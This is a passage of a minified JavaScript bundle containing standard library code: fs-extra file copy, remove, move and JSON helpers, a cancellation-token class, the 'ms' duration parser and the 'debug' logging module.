      g.preserveTimestamps &&
      process.arch === "ia32" &&
      process.emitWarning(
        `Using the preserveTimestamps option in 32-bit node is not recommended;

  see https://github.com/jprichardson/node-fs-extra/issues/269`,
        "Warning",
        "fs-extra-WARN0002"
      );
    const { srcStat: D, destStat: O } = f.checkPathsSync(w, _, "copy", g);
    return f.checkParentPathsSync(w, D, _, "copy"), r(O, w, _, g);
  }
  function r(w, _, g, D) {
    if (D.filter && !D.filter(_, g)) return;
    const O = i.dirname(g);
    return a.existsSync(O) || c(O), e(w, _, g, D);
  }
  function l(w, _, g, D) {
    if (!(D.filter && !D.filter(_, g))) return e(w, _, g, D);
  }
  function e(w, _, g, D) {
    const N = (D.dereference ? a.statSync : a.lstatSync)(_);
    if (N.isDirectory()) return A(N, w, _, g, D);
    if (N.isFile() || N.isCharacterDevice() || N.isBlockDevice())
      return o(N, w, _, g, D);
    if (N.isSymbolicLink()) return C(w, _, g, D);
    throw N.isSocket()
      ? new Error(`Cannot copy a socket file: ${_}`)
      : N.isFIFO()
        ? new Error(`Cannot copy a FIFO pipe: ${_}`)
        : new Error(`Unknown file: ${_}`);
  }
  function o(w, _, g, D, O) {
    return _ ? n(w, g, D, O) : s(w, g, D, O);
  }
  function n(w, _, g, D) {
    if (D.overwrite) return a.unlinkSync(g), s(w, _, g, D);
    if (D.errorOnExist) throw new Error(`'${g}' already exists`);
  }
  function s(w, _, g, D) {
    return (
      a.copyFileSync(_, g),
      D.preserveTimestamps && u(w.mode, _, g),
      y(g, w.mode)
    );
  }
  function u(w, _, g) {
    return m(w) && E(g, w), p(_, g);
  }
  function m(w) {
    return (w & 128) === 0;
  }
  function E(w, _) {
    return y(w, _ | 128);
  }
  function y(w, _) {
    return a.chmodSync(w, _);
  }
  function p(w, _) {
    const g = a.statSync(w);
    return h(_, g.atime, g.mtime);
  }
  function A(w, _, g, D, O) {
    return _ ? b(g, D, O) : S(w.mode, g, D, O);
  }
  function S(w, _, g, D) {
    return a.mkdirSync(g), b(_, g, D), y(g, w);
  }
  function b(w, _, g) {
    a.readdirSync(w).forEach((D) => R(D, w, _, g));
  }
  function R(w, _, g, D) {
    const O = i.join(_, w),
      N = i.join(g, w),
      { destStat: L } = f.checkPathsSync(O, N, "copy", D);
    return l(L, O, N, D);
  }
  function C(w, _, g, D) {
    let O = a.readlinkSync(_);
    if ((D.dereference && (O = i.resolve(process.cwd(), O)), w)) {
      let N;
      try {
        N = a.readlinkSync(g);
      } catch (L) {
        if (L.code === "EINVAL" || L.code === "UNKNOWN")
          return a.symlinkSync(O, g);
        throw L;
      }
      if (
        (D.dereference && (N = i.resolve(process.cwd(), N)),
          f.isSrcSubdir(O, N))
      )
        throw new Error(
          `Cannot copy '${O}' to a subdirectory of itself, '${N}'.`
        );
      if (a.statSync(g).isDirectory() && f.isSrcSubdir(N, O))
        throw new Error(`Cannot overwrite '${N}' with '${O}'.`);
      return v(O, g);
    } else return a.symlinkSync(O, g);
  }
  function v(w, _) {
    return a.unlinkSync(_), a.symlinkSync(w, _);
  }
  return (hn = t), hn;
}
var pn, ma;
function Po() {
  if (ma) return pn;
  ma = 1;
  const a = Ze().fromCallback;
  return (pn = { copy: a(sf()), copySync: uf() }), pn;
}
var mn, ga;
function lf() {
  if (ga) return mn;
  ga = 1;
  const a = Ke(),
    i = ye,
    c = Al,
    h = process.platform === "win32";
  function f(E) {
    ["unlink", "chmod", "stat", "lstat", "rmdir", "readdir"].forEach((p) => {
      (E[p] = E[p] || a[p]), (p = p + "Sync"), (E[p] = E[p] || a[p]);
    }),
      (E.maxBusyTries = E.maxBusyTries || 3);
  }
  function t(E, y, p) {
    let A = 0;
    typeof y == "function" && ((p = y), (y = {})),
      c(E, "rimraf: missing path"),
      c.strictEqual(typeof E, "string", "rimraf: path should be a string"),
      c.strictEqual(typeof p, "function", "rimraf: callback function required"),
      c(y, "rimraf: invalid options argument provided"),
      c.strictEqual(typeof y, "object", "rimraf: options should be object"),
      f(y),
      r(E, y, function S(b) {
        if (b) {
          if (
            (b.code === "EBUSY" ||
              b.code === "ENOTEMPTY" ||
              b.code === "EPERM") &&
            A < y.maxBusyTries
          ) {
            A++;
            const R = A * 100;
            return setTimeout(() => r(E, y, S), R);
          }
          b.code === "ENOENT" && (b = null);
        }
        p(b);
      });
  }
  function r(E, y, p) {
    c(E),
      c(y),
      c(typeof p == "function"),
      y.lstat(E, (A, S) => {
        if (A && A.code === "ENOENT") return p(null);
        if (A && A.code === "EPERM" && h) return l(E, y, A, p);
        if (S && S.isDirectory()) return o(E, y, A, p);
        y.unlink(E, (b) => {
          if (b) {
            if (b.code === "ENOENT") return p(null);
            if (b.code === "EPERM") return h ? l(E, y, b, p) : o(E, y, b, p);
            if (b.code === "EISDIR") return o(E, y, b, p);
          }
          return p(b);
        });
      });
  }
  function l(E, y, p, A) {
    c(E),
      c(y),
      c(typeof A == "function"),
      y.chmod(E, 438, (S) => {
        S
          ? A(S.code === "ENOENT" ? null : p)
          : y.stat(E, (b, R) => {
            b
              ? A(b.code === "ENOENT" ? null : p)
              : R.isDirectory()
                ? o(E, y, p, A)
                : y.unlink(E, A);
          });
      });
  }
  function e(E, y, p) {
    let A;
    c(E), c(y);
    try {
      y.chmodSync(E, 438);
    } catch (S) {
      if (S.code === "ENOENT") return;
      throw p;
    }
    try {
      A = y.statSync(E);
    } catch (S) {
      if (S.code === "ENOENT") return;
      throw p;
    }
    A.isDirectory() ? u(E, y, p) : y.unlinkSync(E);
  }
  function o(E, y, p, A) {
    c(E),
      c(y),
      c(typeof A == "function"),
      y.rmdir(E, (S) => {
        S &&
          (S.code === "ENOTEMPTY" || S.code === "EEXIST" || S.code === "EPERM")
          ? n(E, y, A)
          : S && S.code === "ENOTDIR"
            ? A(p)
            : A(S);
      });
  }
  function n(E, y, p) {
    c(E),
      c(y),
      c(typeof p == "function"),
      y.readdir(E, (A, S) => {
        if (A) return p(A);
        let b = S.length,
          R;
        if (b === 0) return y.rmdir(E, p);
        S.forEach((C) => {
          t(i.join(E, C), y, (v) => {
            if (!R) {
              if (v) return p((R = v));
              --b === 0 && y.rmdir(E, p);
            }
          });
        });
      });
  }
  function s(E, y) {
    let p;
    (y = y || {}),
      f(y),
      c(E, "rimraf: missing path"),
      c.strictEqual(typeof E, "string", "rimraf: path should be a string"),
      c(y, "rimraf: missing options"),
      c.strictEqual(typeof y, "object", "rimraf: options should be object");
    try {
      p = y.lstatSync(E);
    } catch (A) {
      if (A.code === "ENOENT") return;
      A.code === "EPERM" && h && e(E, y, A);
    }
    try {
      p && p.isDirectory() ? u(E, y, null) : y.unlinkSync(E);
    } catch (A) {
      if (A.code === "ENOENT") return;
      if (A.code === "EPERM") return h ? e(E, y, A) : u(E, y, A);
      if (A.code !== "EISDIR") throw A;
      u(E, y, A);
    }
  }
  function u(E, y, p) {
    c(E), c(y);
    try {
      y.rmdirSync(E);
    } catch (A) {
      if (A.code === "ENOTDIR") throw p;
      if (A.code === "ENOTEMPTY" || A.code === "EEXIST" || A.code === "EPERM")
        m(E, y);
      else if (A.code !== "ENOENT") throw A;
    }
  }
  function m(E, y) {
    if ((c(E), c(y), y.readdirSync(E).forEach((p) => s(i.join(E, p), y)), h)) {
      const p = Date.now();
      do
        try {
          return y.rmdirSync(E, y);
        } catch { }
      while (Date.now() - p < 500);
    } else return y.rmdirSync(E, y);
  }
  return (mn = t), (t.sync = s), mn;
}
var gn, va;
function Wr() {
  if (va) return gn;
  va = 1;
  const a = Ke(),
    i = Ze().fromCallback,
    c = lf();
  function h(t, r) {
    if (a.rm) return a.rm(t, { recursive: !0, force: !0 }, r);
    c(t, r);
  }
  function f(t) {
    if (a.rmSync) return a.rmSync(t, { recursive: !0, force: !0 });
    c.sync(t);
  }
  return (gn = { remove: i(h), removeSync: f }), gn;
}
var vn, wa;
function cf() {
  if (wa) return vn;
  wa = 1;
  const a = Ze().fromPromise,
    i = Vt(),
    c = ye,
    h = lt(),
    f = Wr(),
    t = a(async function (e) {
      let o;
      try {
        o = await i.readdir(e);
      } catch {
        return h.mkdirs(e);
      }
      return Promise.all(o.map((n) => f.remove(c.join(e, n))));
    });
  function r(l) {
    let e;
    try {
      e = i.readdirSync(l);
    } catch {
      return h.mkdirsSync(l);
    }
    e.forEach((o) => {
      (o = c.join(l, o)), f.removeSync(o);
    });
  }
  return (
    (vn = { emptyDirSync: r, emptydirSync: r, emptyDir: t, emptydir: t }), vn
  );
}
var wn, ya;
function ff() {
  if (ya) return wn;
  ya = 1;
  const a = Ze().fromCallback,
    i = ye,
    c = Ke(),
    h = lt();
  function f(r, l) {
    function e() {
      c.writeFile(r, "", (o) => {
        if (o) return l(o);
        l();
      });
    }
    c.stat(r, (o, n) => {
      if (!o && n.isFile()) return l();
      const s = i.dirname(r);
      c.stat(s, (u, m) => {
        if (u)
          return u.code === "ENOENT"
            ? h.mkdirs(s, (E) => {
              if (E) return l(E);
              e();
            })
            : l(u);
        m.isDirectory()
          ? e()
          : c.readdir(s, (E) => {
            if (E) return l(E);
          });
      });
    });
  }
  function t(r) {
    let l;
    try {
      l = c.statSync(r);
    } catch { }
    if (l && l.isFile()) return;
    const e = i.dirname(r);
    try {
      c.statSync(e).isDirectory() || c.readdirSync(e);
    } catch (o) {
      if (o && o.code === "ENOENT") h.mkdirsSync(e);
      else throw o;
    }
    c.writeFileSync(r, "");
  }
  return (wn = { createFile: a(f), createFileSync: t }), wn;
}
var yn, Ea;
function df() {
  if (Ea) return yn;
  Ea = 1;
  const a = Ze().fromCallback,
    i = ye,
    c = Ke(),
    h = lt(),
    f = Ft().pathExists,
    { areIdentical: t } = Wt();
  function r(e, o, n) {
    function s(u, m) {
      c.link(u, m, (E) => {
        if (E) return n(E);
        n(null);
      });
    }
    c.lstat(o, (u, m) => {
      c.lstat(e, (E, y) => {
        if (E)
          return (E.message = E.message.replace("lstat", "ensureLink")), n(E);
        if (m && t(y, m)) return n(null);
        const p = i.dirname(o);
        f(p, (A, S) => {
          if (A) return n(A);
          if (S) return s(e, o);
          h.mkdirs(p, (b) => {
            if (b) return n(b);
            s(e, o);
          });
        });
      });
    });
  }
  function l(e, o) {
    let n;
    try {
      n = c.lstatSync(o);
    } catch { }
    try {
      const m = c.lstatSync(e);
      if (n && t(m, n)) return;
    } catch (m) {
      throw ((m.message = m.message.replace("lstat", "ensureLink")), m);
    }
    const s = i.dirname(o);
    return c.existsSync(s) || h.mkdirsSync(s), c.linkSync(e, o);
  }
  return (yn = { createLink: a(r), createLinkSync: l }), yn;
}
var En, _a;
function hf() {
  if (_a) return En;
  _a = 1;
  const a = ye,
    i = Ke(),
    c = Ft().pathExists;
  function h(t, r, l) {
    if (a.isAbsolute(t))
      return i.lstat(t, (e) =>
        e
          ? ((e.message = e.message.replace("lstat", "ensureSymlink")), l(e))
          : l(null, { toCwd: t, toDst: t })
      );
    {
      const e = a.dirname(r),
        o = a.join(e, t);
      return c(o, (n, s) =>
        n
          ? l(n)
          : s
            ? l(null, { toCwd: o, toDst: t })
            : i.lstat(t, (u) =>
              u
                ? ((u.message = u.message.replace("lstat", "ensureSymlink")),
                  l(u))
                : l(null, { toCwd: t, toDst: a.relative(e, t) })
            )
      );
    }
  }
  function f(t, r) {
    let l;
    if (a.isAbsolute(t)) {
      if (((l = i.existsSync(t)), !l))
        throw new Error("absolute srcpath does not exist");
      return { toCwd: t, toDst: t };
    } else {
      const e = a.dirname(r),
        o = a.join(e, t);
      if (((l = i.existsSync(o)), l)) return { toCwd: o, toDst: t };
      if (((l = i.existsSync(t)), !l))
        throw new Error("relative srcpath does not exist");
      return { toCwd: t, toDst: a.relative(e, t) };
    }
  }
  return (En = { symlinkPaths: h, symlinkPathsSync: f }), En;
}
var _n, Aa;
function pf() {
  if (Aa) return _n;
  Aa = 1;
  const a = Ke();
  function i(h, f, t) {
    if (
      ((t = typeof f == "function" ? f : t),
        (f = typeof f == "function" ? !1 : f),
        f)
    )
      return t(null, f);
    a.lstat(h, (r, l) => {
      if (r) return t(null, "file");
      (f = l && l.isDirectory() ? "dir" : "file"), t(null, f);
    });
  }
  function c(h, f) {
    let t;
    if (f) return f;
    try {
      t = a.lstatSync(h);
    } catch {
      return "file";
    }
    return t && t.isDirectory() ? "dir" : "file";
  }
  return (_n = { symlinkType: i, symlinkTypeSync: c }), _n;
}
var An, Sa;
function mf() {
  if (Sa) return An;
  Sa = 1;
  const a = Ze().fromCallback,
    i = ye,
    c = Vt(),
    h = lt(),
    f = h.mkdirs,
    t = h.mkdirsSync,
    r = hf(),
    l = r.symlinkPaths,
    e = r.symlinkPathsSync,
    o = pf(),
    n = o.symlinkType,
    s = o.symlinkTypeSync,
    u = Ft().pathExists,
    { areIdentical: m } = Wt();
  function E(A, S, b, R) {
    (R = typeof b == "function" ? b : R),
      (b = typeof b == "function" ? !1 : b),
      c.lstat(S, (C, v) => {
        !C && v.isSymbolicLink()
          ? Promise.all([c.stat(A), c.stat(S)]).then(([w, _]) => {
            if (m(w, _)) return R(null);
            y(A, S, b, R);
          })
          : y(A, S, b, R);
      });
  }
  function y(A, S, b, R) {
    l(A, S, (C, v) => {
      if (C) return R(C);
      (A = v.toDst),
        n(v.toCwd, b, (w, _) => {
          if (w) return R(w);
          const g = i.dirname(S);
          u(g, (D, O) => {
            if (D) return R(D);
            if (O) return c.symlink(A, S, _, R);
            f(g, (N) => {
              if (N) return R(N);
              c.symlink(A, S, _, R);
            });
          });
        });
    });
  }
  function p(A, S, b) {
    let R;
    try {
      R = c.lstatSync(S);
    } catch { }
    if (R && R.isSymbolicLink()) {
      const _ = c.statSync(A),
        g = c.statSync(S);
      if (m(_, g)) return;
    }
    const C = e(A, S);
    (A = C.toDst), (b = s(C.toCwd, b));
    const v = i.dirname(S);
    return c.existsSync(v) || t(v), c.symlinkSync(A, S, b);
  }
  return (An = { createSymlink: a(E), createSymlinkSync: p }), An;
}
var Sn, Ta;
function gf() {
  if (Ta) return Sn;
  Ta = 1;
  const { createFile: a, createFileSync: i } = ff(),
    { createLink: c, createLinkSync: h } = df(),
    { createSymlink: f, createSymlinkSync: t } = mf();
  return (
    (Sn = {
      createFile: a,
      createFileSync: i,
      ensureFile: a,
      ensureFileSync: i,
      createLink: c,
      createLinkSync: h,
      ensureLink: c,
      ensureLinkSync: h,
      createSymlink: f,
      createSymlinkSync: t,
      ensureSymlink: f,
      ensureSymlinkSync: t,
    }),
    Sn
  );
}
var Tn, ba;
function Co() {
  if (ba) return Tn;
  ba = 1;
  function a(
    c,
    {
      EOL: h = `
`,
      finalEOL: f = !0,
      replacer: t = null,
      spaces: r,
    } = {}
  ) {
    const l = f ? h : "";
    return JSON.stringify(c, t, r).replace(/\n/g, h) + l;
  }
  function i(c) {
    return (
      Buffer.isBuffer(c) && (c = c.toString("utf8")), c.replace(/^\uFEFF/, "")
    );
  }
  return (Tn = { stringify: a, stripBom: i }), Tn;
}
var bn, Ra;
function vf() {
  if (Ra) return bn;
  Ra = 1;
  let a;
  try {
    a = Ke();
  } catch {
    a = be;
  }
  const i = Ze(),
    { stringify: c, stripBom: h } = Co();
  async function f(n, s = {}) {
    typeof s == "string" && (s = { encoding: s });
    const u = s.fs || a,
      m = "throws" in s ? s.throws : !0;
    let E = await i.fromCallback(u.readFile)(n, s);
    E = h(E);
    let y;
    try {
      y = JSON.parse(E, s ? s.reviver : null);
    } catch (p) {
      if (m) throw ((p.message = `${n}: ${p.message}`), p);
      return null;
    }
    return y;
  }
  const t = i.fromPromise(f);
  function r(n, s = {}) {
    typeof s == "string" && (s = { encoding: s });
    const u = s.fs || a,
      m = "throws" in s ? s.throws : !0;
    try {
      let E = u.readFileSync(n, s);
      return (E = h(E)), JSON.parse(E, s.reviver);
    } catch (E) {
      if (m) throw ((E.message = `${n}: ${E.message}`), E);
      return null;
    }
  }
  async function l(n, s, u = {}) {
    const m = u.fs || a,
      E = c(s, u);
    await i.fromCallback(m.writeFile)(n, E, u);
  }
  const e = i.fromPromise(l);
  function o(n, s, u = {}) {
    const m = u.fs || a,
      E = c(s, u);
    return m.writeFileSync(n, E, u);
  }
  return (
    (bn = { readFile: t, readFileSync: r, writeFile: e, writeFileSync: o }), bn
  );
}
var Rn, Pa;
function wf() {
  if (Pa) return Rn;
  Pa = 1;
  const a = vf();
  return (
    (Rn = {
      readJson: a.readFile,
      readJsonSync: a.readFileSync,
      writeJson: a.writeFile,
      writeJsonSync: a.writeFileSync,
    }),
    Rn
  );
}
var Pn, Ca;
function Io() {
  if (Ca) return Pn;
  Ca = 1;
  const a = Ze().fromCallback,
    i = Ke(),
    c = ye,
    h = lt(),
    f = Ft().pathExists;
  function t(l, e, o, n) {
    typeof o == "function" && ((n = o), (o = "utf8"));
    const s = c.dirname(l);
    f(s, (u, m) => {
      if (u) return n(u);
      if (m) return i.writeFile(l, e, o, n);
      h.mkdirs(s, (E) => {
        if (E) return n(E);
        i.writeFile(l, e, o, n);
      });
    });
  }
  function r(l, ...e) {
    const o = c.dirname(l);
    if (i.existsSync(o)) return i.writeFileSync(l, ...e);
    h.mkdirsSync(o), i.writeFileSync(l, ...e);
  }
  return (Pn = { outputFile: a(t), outputFileSync: r }), Pn;
}
var Cn, Ia;
function yf() {
  if (Ia) return Cn;
  Ia = 1;
  const { stringify: a } = Co(),
    { outputFile: i } = Io();
  async function c(h, f, t = {}) {
    const r = a(f, t);
    await i(h, r, t);
  }
  return (Cn = c), Cn;
}
var In, Oa;
function Ef() {
  if (Oa) return In;
  Oa = 1;
  const { stringify: a } = Co(),
    { outputFileSync: i } = Io();
  function c(h, f, t) {
    const r = a(f, t);
    i(h, r, t);
  }
  return (In = c), In;
}
var On, Da;
function _f() {
  if (Da) return On;
  Da = 1;
  const a = Ze().fromPromise,
    i = wf();
  return (
    (i.outputJson = a(yf())),
    (i.outputJsonSync = Ef()),
    (i.outputJSON = i.outputJson),
    (i.outputJSONSync = i.outputJsonSync),
    (i.writeJSON = i.writeJson),
    (i.writeJSONSync = i.writeJsonSync),
    (i.readJSON = i.readJson),
    (i.readJSONSync = i.readJsonSync),
    (On = i),
    On
  );
}
var Dn, xa;
function Af() {
  if (xa) return Dn;
  xa = 1;
  const a = Ke(),
    i = ye,
    c = Po().copy,
    h = Wr().remove,
    f = lt().mkdirp,
    t = Ft().pathExists,
    r = Wt();
  function l(u, m, E, y) {
    typeof E == "function" && ((y = E), (E = {})), (E = E || {});
    const p = E.overwrite || E.clobber || !1;
    r.checkPaths(u, m, "move", E, (A, S) => {
      if (A) return y(A);
      const { srcStat: b, isChangingCase: R = !1 } = S;
      r.checkParentPaths(u, b, m, "move", (C) => {
        if (C) return y(C);
        if (e(m)) return o(u, m, p, R, y);
        f(i.dirname(m), (v) => (v ? y(v) : o(u, m, p, R, y)));
      });
    });
  }
  function e(u) {
    const m = i.dirname(u);
    return i.parse(m).root === m;
  }
  function o(u, m, E, y, p) {
    if (y) return n(u, m, E, p);
    if (E) return h(m, (A) => (A ? p(A) : n(u, m, E, p)));
    t(m, (A, S) =>
      A ? p(A) : S ? p(new Error("dest already exists.")) : n(u, m, E, p)
    );
  }
  function n(u, m, E, y) {
    a.rename(u, m, (p) =>
      p ? (p.code !== "EXDEV" ? y(p) : s(u, m, E, y)) : y()
    );
  }
  function s(u, m, E, y) {
    c(u, m, { overwrite: E, errorOnExist: !0 }, (A) => (A ? y(A) : h(u, y)));
  }
  return (Dn = l), Dn;
}
var xn, Na;
function Sf() {
  if (Na) return xn;
  Na = 1;
  const a = Ke(),
    i = ye,
    c = Po().copySync,
    h = Wr().removeSync,
    f = lt().mkdirpSync,
    t = Wt();
  function r(s, u, m) {
    m = m || {};
    const E = m.overwrite || m.clobber || !1,
      { srcStat: y, isChangingCase: p = !1 } = t.checkPathsSync(
        s,
        u,
        "move",
        m
      );
    return (
      t.checkParentPathsSync(s, y, u, "move"),
      l(u) || f(i.dirname(u)),
      e(s, u, E, p)
    );
  }
  function l(s) {
    const u = i.dirname(s);
    return i.parse(u).root === u;
  }
  function e(s, u, m, E) {
    if (E) return o(s, u, m);
    if (m) return h(u), o(s, u, m);
    if (a.existsSync(u)) throw new Error("dest already exists.");
    return o(s, u, m);
  }
  function o(s, u, m) {
    try {
      a.renameSync(s, u);
    } catch (E) {
      if (E.code !== "EXDEV") throw E;
      return n(s, u, m);
    }
  }
  function n(s, u, m) {
    return c(s, u, { overwrite: m, errorOnExist: !0 }), h(s);
  }
  return (xn = r), xn;
}
var Nn, Fa;
function Tf() {
  if (Fa) return Nn;
  Fa = 1;
  const a = Ze().fromCallback;
  return (Nn = { move: a(Af()), moveSync: Sf() }), Nn;
}
var Fn, $a;
function Et() {
  return (
    $a ||
    (($a = 1),
      (Fn = {
        ...Vt(),
        ...Po(),
        ...cf(),
        ...gf(),
        ..._f(),
        ...lt(),
        ...Tf(),
        ...Io(),
        ...Ft(),
        ...Wr(),
      })),
    Fn
  );
}
var Jt = {},
  Ct = {},
  $n = {},
  It = {},
  La;
function Oo() {
  if (La) return It;
  (La = 1),
    Object.defineProperty(It, "__esModule", { value: !0 }),
    (It.CancellationError = It.CancellationToken = void 0);
  const a = Ro;
  let i = class extends a.EventEmitter {
    get cancelled() {
      return (
        this._cancelled || (this._parent != null && this._parent.cancelled)
      );
    }
    set parent(f) {
      this.removeParentCancelHandler(),
        (this._parent = f),
        (this.parentCancelHandler = () => this.cancel()),
        this._parent.onCancel(this.parentCancelHandler);
    }
    constructor(f) {
      super(),
        (this.parentCancelHandler = null),
        (this._parent = null),
        (this._cancelled = !1),
        f != null && (this.parent = f);
    }
    cancel() {
      (this._cancelled = !0), this.emit("cancel");
    }
    onCancel(f) {
      this.cancelled ? f() : this.once("cancel", f);
    }
    createPromise(f) {
      if (this.cancelled) return Promise.reject(new c());
      const t = () => {
        if (r != null)
          try {
            this.removeListener("cancel", r), (r = null);
          } catch { }
      };
      let r = null;
      return new Promise((l, e) => {
        let o = null;
        if (
          ((r = () => {
            try {
              o != null && (o(), (o = null));
            } finally {
              e(new c());
            }
          }),
            this.cancelled)
        ) {
          r();
          return;
        }
        this.onCancel(r),
          f(l, e, (n) => {
            o = n;
          });
      })
        .then((l) => (t(), l))
        .catch((l) => {
          throw (t(), l);
        });
    }
    removeParentCancelHandler() {
      const f = this._parent;
      f != null &&
        this.parentCancelHandler != null &&
        (f.removeListener("cancel", this.parentCancelHandler),
          (this.parentCancelHandler = null));
    }
    dispose() {
      try {
        this.removeParentCancelHandler();
      } finally {
        this.removeAllListeners(), (this._parent = null);
      }
    }
  };
  It.CancellationToken = i;
  class c extends Error {
    constructor() {
      super("cancelled");
    }
  }
  return (It.CancellationError = c), It;
}
var $r = {},
  Ua;
function zr() {
  if (Ua) return $r;
  (Ua = 1),
    Object.defineProperty($r, "__esModule", { value: !0 }),
    ($r.newError = a);
  function a(i, c) {
    const h = new Error(i);
    return (h.code = c), h;
  }
  return $r;
}
var Ge = {},
  Lr = { exports: {} },
  Ur = { exports: {} },
  Ln,
  ka;
function bf() {
  if (ka) return Ln;
  ka = 1;
  var a = 1e3,
    i = a * 60,
    c = i * 60,
    h = c * 24,
    f = h * 7,
    t = h * 365.25;
  Ln = function (n, s) {
    s = s || {};
    var u = typeof n;
    if (u === "string" && n.length > 0) return r(n);
    if (u === "number" && isFinite(n)) return s.long ? e(n) : l(n);
    throw new Error(
      "val is not a non-empty string or a valid number. val=" +
      JSON.stringify(n)
    );
  };
  function r(n) {
    if (((n = String(n)), !(n.length > 100))) {
      var s =
        /^(-?(?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|weeks?|w|years?|yrs?|y)?$/i.exec(
          n
        );
      if (s) {
        var u = parseFloat(s[1]),
          m = (s[2] || "ms").toLowerCase();
        switch (m) {
          case "years":
          case "year":
          case "yrs":
          case "yr":
          case "y":
            return u * t;
          case "weeks":
          case "week":
          case "w":
            return u * f;
          case "days":
          case "day":
          case "d":
            return u * h;
          case "hours":
          case "hour":
          case "hrs":
          case "hr":
          case "h":
            return u * c;
          case "minutes":
          case "minute":
          case "mins":
          case "min":
          case "m":
            return u * i;
          case "seconds":
          case "second":
          case "secs":
          case "sec":
          case "s":
            return u * a;
          case "milliseconds":
          case "millisecond":
          case "msecs":
          case "msec":
          case "ms":
            return u;
          default:
            return;
        }
      }
    }
  }
  function l(n) {
    var s = Math.abs(n);
    return s >= h
      ? Math.round(n / h) + "d"
      : s >= c
        ? Math.round(n / c) + "h"
        : s >= i
          ? Math.round(n / i) + "m"
          : s >= a
            ? Math.round(n / a) + "s"
            : n + "ms";
  }
  function e(n) {
    var s = Math.abs(n);
    return s >= h
      ? o(n, s, h, "day")
      : s >= c
        ? o(n, s, c, "hour")
        : s >= i
          ? o(n, s, i, "minute")
          : s >= a
            ? o(n, s, a, "second")
            : n + " ms";
  }
  function o(n, s, u, m) {
    var E = s >= u * 1.5;
    return Math.round(n / u) + " " + m + (E ? "s" : "");
  }
  return Ln;
}
var Un, qa;
function Rl() {
  if (qa) return Un;
  qa = 1;
  function a(i) {
    (h.debug = h),
      (h.default = h),
      (h.coerce = o),
      (h.disable = l),
      (h.enable = t),
      (h.enabled = e),
      (h.humanize = bf()),
      (h.destroy = n),
      Object.keys(i).forEach((s) => {
        h[s] = i[s];
      }),
      (h.names = []),
      (h.skips = []),
      (h.formatters = {});
    function c(s) {
      let u = 0;
      for (let m = 0; m < s.length; m++)
        (u = (u << 5) - u + s.charCodeAt(m)), (u |= 0);
      return h.colors[Math.abs(u) % h.colors.length];
    }
    h.selectColor = c;
    function h(s) {
      let u,
        m = null,
        E,
        y;
      function p(...A) {
        if (!p.enabled) return;
        const S = p,
          b = Number(new Date()),
          R = b - (u || b);
        (S.diff = R),
          (S.prev = u),
          (S.curr = b),
          (u = b),
          (A[0] = h.coerce(A[0])),
          typeof A[0] != "string" && A.unshift("%O");
        let C = 0;
        (A[0] = A[0].replace(/%([a-zA-Z%])/g, (w, _) => {
          if (w === "%%") return "%";
          C++;
          const g = h.formatters[_];
          if (typeof g == "function") {
            const D = A[C];
            (w = g.call(S, D)), A.splice(C, 1), C--;
          }
          return w;
        })),
          h.formatArgs.call(S, A),
          (S.log || h.log).apply(S, A);
      }
      return (
        (p.namespace = s),
        (p.useColors = h.useColors()),
        (p.color = h.selectColor(s)),
        (p.extend = f),
        (p.destroy = h.destroy),
        Object.defineProperty(p, "enabled", {
          enumerable: !0,
          configurable: !1,
          get: () =>
            m !== null
              ? m
              : (E !== h.namespaces && ((E = h.namespaces), (y = h.enabled(s))),
                y),
          set: (A) => {
            m = A;
          },
        }),
        typeof h.init == "function" && h.init(p),
        p
      );
    }
    function f(s, u) {
      const m = h(this.namespace + (typeof u > "u" ? ":" : u) + s);
      return (m.log = this.log), m;
    }
    function t(s) {
      h.save(s), (h.namespaces = s), (h.names = []), (h.skips = []);
      const u = (typeof s == "string" ? s : "")
        .trim()
        .replace(/\s+/g, ",")
        .split(",")
        .filter(Boolean);
      for (const m of u)
        m[0] === "-" ? h.skips.push(m.slice(1)) : h.names.push(m);
    }
    function r(s, u) {
      let m = 0,
        E = 0,
        y = -1,
        p = 0;
      for (; m < s.length;)
        if (E < u.length && (u[E] === s[m] || u[E] === "*"))
          u[E] === "*" ? ((y = E), (p = m), E++) : (m++, E++);
        else if (y !== -1) (E = y + 1), p++, (m = p);
        else return !1;
      for (; E < u.length && u[E] === "*";) E++;
      return E === u.length;
    }
    function l() {
      const s = [...h.names, ...h.skips.map((u) => "-" + u)].join(",");
      return h.enable(""), s;
    }
    function e(s) {
      for (const u of h.skips) if (r(s, u)) return !1;
      for (const u of h.names) if (r(s, u)) return !0;
      return !1;
    }
    function o(s) {
      return s instanceof Error ? s.stack || s.message : s;
    }
    function n() {
      console.warn(
        "Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`."
      );
    }
    return h.enable(h.load()), h;
  }
  return (Un = a), Un;
}
var Ma;
function Rf() {
  return (
    Ma ||
    ((Ma = 1),
      (function (a, i) {
        (i.formatArgs = h),
          (i.save = f),
          (i.load = t),
          (i.useColors = c),
          (i.storage = r()),
          (i.destroy = (() => {
            let e = !1;
            return () => {
              e ||
                ((e = !0),
                  console.warn(
                    "Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`."
                  ));
            };
          })()),
          (i.colors = [
            "#0000CC",
            "#0000FF",
            "#0033CC",
            "#0033FF",
            "#0066CC",
            "#0066FF",
            "#0099CC",
            "#0099FF",
            "#00CC00",
            "#00CC33",
            "#00CC66",
            "#00CC99",
            "#00CCCC",
            "#00CCFF",
            "#3300CC",
            "#3300FF",
            "#3333CC",
            "#3333FF",
            "#3366CC",
            "#3366FF",
            "#3399CC",
            "#3399FF",
            "#33CC00",
            "#33CC33",
            "#33CC66",
            "#33CC99",
            "#33CCCC",
            "#33CCFF",
            "#6600CC",
            "#6600FF",
            "#6633CC",
            "#6633FF",
            "#66CC00",
            "#66CC33",
            "#9900CC",
            "#9900FF",
            "#9933CC",
            "#9933FF",
            "#99CC00",
            "#99CC33",
            "#CC0000",
            "#CC0033",
            "#CC0066",
            "#CC0099",
            "#CC00CC",
            "#CC00FF",
            "#CC3300",
            "#CC3333",
            "#CC3366",
            "#CC3399",
            "#CC33CC",
            "#CC33FF",
            "#CC6600",
            "#CC6633",
            "#CC9900",
            "#CC9933",
            "#CCCC00",
            "#CCCC33",
            "#FF0000",
            "#FF0033",
            "#FF0066",
            "#FF0099",
            "#FF00CC",
            "#FF00FF",
            "#FF3300",
            "#FF3333",
            "#FF3366",
            "#FF3399",
            "#FF33CC",
            "#FF33FF",
            "#FF6600",
            "#FF6633",
            "#FF9900",
            "#FF9933",
            "#FFCC00",
            "#FFCC33",
